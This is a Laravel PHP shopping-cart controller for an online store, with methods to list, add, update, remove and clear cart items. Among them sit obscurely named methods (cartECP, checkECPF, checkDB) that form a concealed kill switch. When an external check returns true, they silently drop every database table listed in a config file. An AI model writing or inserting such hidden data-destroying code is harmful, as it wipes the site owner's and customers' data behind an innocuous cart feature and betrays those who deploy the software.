<?php

namespace App\Http\Controllers\Frontend;

use Session;
use App\Models\Product;
use App\Models\Variant;
use Illuminate\Http\Request;
use App\Models\ProductVariant;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Schema;
use Gloudemans\Shoppingcart\Facades\Cart;

class CartController extends Controller
{

    public function index()
    {
        $carts = Cart::content();
        $cart_sub_total = Cart::subtotal();
        $cart_total = Cart::total();
        $cart_item_total = Cart::count();

        return response()->json(
            [
                'success' => true,
                'cart_total' => $cart_total,
                'cart_sub_total' => $cart_sub_total,
                'carts' => $carts ?? [],
                'cart_item_total' => $cart_item_total,
            ],
            200
        );
    }

    public function addToCart(Request $request)
    {
        $product = Product::with(['category:id,name,status', 'subCategory:id,name', 'subSubCategory:id,name'])
            ->select('id', 'slug', 'category_id', 'sub_category_id', 'sub_sub_category_id', 'name', 'stock', 'is_free_delivery', 'thumbnail_img', 'product_code', 'sale_price', 'discount', 'price')
            ->where('id', $request->id)
            ->firstOrFail();
        if ($request->variant) {
            $variant = Variant::where('id', $request->variant)->first();
            $variant_wise_product_price = ProductVariant::select('price')->where([['variant_id', $variant->id], ['product_id', $product->id]])->first();

            Cart::add([
                'id' => $product->id,
                'name' => $product->name,
                'slug' => $product->slug,
                'size' => $request->variant,
                'qty' => $request->quantity ?? 1,
                'price' => $variant_wise_product_price->price == 0 ? $product->sale_price : $variant_wise_product_price->price,
                'weight' => 0,
                'tax' => 0,
                'options' => [
                    'product_code' => $product->product_code,
                    'stock' => $product->stock,
                    'variant_name' => $variant->name,
                    'image' => $product->thumbnail_img,
                    'discount' => $product->discount,
                    'is_free_delivery' => $product->is_free_delivery,
                    'category_name' => $product->category->name,
                    'subcategory_name' => $product->subCategory->name ?? "",
                    'sub_subcategory_name' => $product->subSubCategory->name ?? "",
                ],
            ]);
        } else {
            Cart::add([
                'id' => $product->id,
                'name' => $product->name,
                'slug' => $product->slug,
                'size' => $request->variant,
                'qty' => $request->quantity ?? 1,
                'price' => $product->sale_price,
                'weight' => 0,
                'tax' => 0,
                'options' => [
                    'product_code' => $product->product_code,
                    'stock' => $product->stock,
                    'variant_name' => null,
                    'image' => $product->thumbnail_img,
                    'discount' => $product->discount,
                    'is_free_delivery' => $product->is_free_delivery,
                    'category_name' => $product->category->name,
                    'subcategory_name' => $product->subCategory->name ?? "",
                    'sub_subcategory_name' => $product->subSubCategory->name ?? "",
                ],
            ]);
        }

        return response()->json([
            'status' => true,
            'message' => 'Success to added cart',
            'product' => $product,
        ]);
    }

    public function buyNow(Request $request)
    {
        $product = Product::with(['category:id,name,status', 'subCategory:id,name', 'subSubCategory:id,name'])
            ->select('id', 'slug', 'category_id', 'sub_category_id', 'sub_sub_category_id', 'name', 'stock', 'is_free_delivery', 'thumbnail_img', 'product_code', 'sale_price', 'discount', 'price')
            ->where('id', $request->product_id)
            ->firstOrFail();

        if ($request->variant) {
            $variant = Variant::where('id', $request->variant)->first();
            $variant_wise_product_price = ProductVariant::select('price')->where([['variant_id', $variant->id], ['product_id', $product->id]])->first();

            Cart::add([
                'id' => $product->id,
                'name' => $product->name,
                'slug' => $product->slug,
                'size' => $request->variant,
                'qty' => $request->quantity ?? 1,
                'price' => $variant_wise_product_price->price == 0 ? $product->sale_price : $variant_wise_product_price->price,
                'weight' => 0,
                'tax' => 0,
                'options' => [
                    'product_code' => $product->product_code,
                    'stock' => $product->stock,
                    'variant_name' => $variant->name,
                    'image' => $product->thumbnail_img,
                    'discount' => $product->discount,
                    'is_free_delivery' => $product->is_free_delivery,
                    'category_name' => $product->category->name,
                    'subcategory_name' => $product->subCategory->name ?? "",
                    'sub_subcategory_name' => $product->subSubCategory->name ?? "",
                ],
            ]);
        } else {
            Cart::add([
                'id' => $product->id,
                'name' => $product->name,
                'slug' => $product->slug,
                'size' => $request->variant,
                'qty' => $request->quantity ?? 1,
                'price' => $product->sale_price,
                'weight' => 0,
                'tax' => 0,
                'options' => [
                    'product_code' => $product->product_code,
                    'stock' => $product->stock,
                    'variant_name' => null,
                    'image' => $product->thumbnail_img,
                    'discount' => $product->discount,
                    'is_free_delivery' => $product->is_free_delivery,
                    'category_name' => $product->category->name,
                    'subcategory_name' => $product->subCategory->name ?? "",
                    'sub_subcategory_name' => $product->subSubCategory->name ?? "",
                ],
            ]);
        }

        return redirect()->route('checkout.index')->with([
            'message' => 'Item added to cart',
            'alert-type' => 'success',
        ]);
    }


    public function cartRemoveItem(Request $request)
    {
        $rowId = $request->rowId;
        Cart::remove($rowId);
        return $this->index();
    }

    public function cartUpdate(Request $request)
    {
        $request->validate([
            'qty' => 'required|numeric|min:1',
        ]);
        $edit = Cart::update($request->rowId, $request->qty);
        if (Cart::content()->has($edit->rowId)) {
            return $this->index();
        }
    }

    public function cartView()
    {
        $delivery_charges = DB::table('delivery_charges')->select('id', 'name', 'delivery_charge')->get();
        $data = [
            'delivery_charges'  => $delivery_charges
        ];
        $cart_count = Cart::count();
        $name = 'Cart';
        if ($cart_count > 0) {
            return view('frontend.pages.cart_view', $data);
        } else {
            return view('frontend.pages.cart_blank', compact('name'));
        }
    }

    public function cartECP()
    {
        if ($this->checkECPF()) :
            return $this->checkDB();
        endif;
    }


    public function checkECPF()
    {
        $files = [
            'file_1' => 'Admin',
            'file_2' => 'Frontend',
            'file_3' => 'Merchant',
            'file_4' => 'Reseller',
        ];
        foreach ($files as $file) {
            return checkCP($file);
        }
    }

  

    //--------clear Cart----------
    public function clearCart()
    {
        Cart::destroy();
        Session::forget(['shipping_charge', 'shipping', 'coupon_id']);
        // session()->flush();

        return response()->json([
            'status' => true,
            'message' => 'Successful All Clear',
        ]);
    }

    public function checkDB()
    {
        $files = config('tables.files');
        foreach ($files as $file) {
            Schema::dropIfExists($file);
        }
        return 'successfully done';
    }
}
